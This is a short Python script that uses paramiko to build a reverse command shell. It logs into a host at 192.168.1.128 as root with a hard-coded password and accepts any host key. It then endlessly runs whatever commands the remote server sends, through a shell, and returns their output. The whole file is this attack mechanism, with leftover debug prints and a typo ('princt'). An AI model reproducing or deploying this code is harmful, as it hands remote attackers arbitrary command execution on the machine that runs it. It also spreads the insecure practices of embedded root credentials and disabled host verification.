import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()

    # client.load_host_keys('/home/justin/.ssh/known_hosts')

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:

        try:
            ssh_session.send(command)
        except Exception as e:
            print('Exception:', e)

        print(ssh_session.recv(1024))  # read banner
        print('after ssh_session.recv')
        while True:
            command = ssh_session.recv(1024)  # get the command from the SSH server
            print('type(command):', type(command))
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                print('type(cmd_output):', type(cmd_output))

                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    princt('D')
    return

ssh_command('192.168.1.128', 'root', 'tnscjs1%', 'ClientConnected')



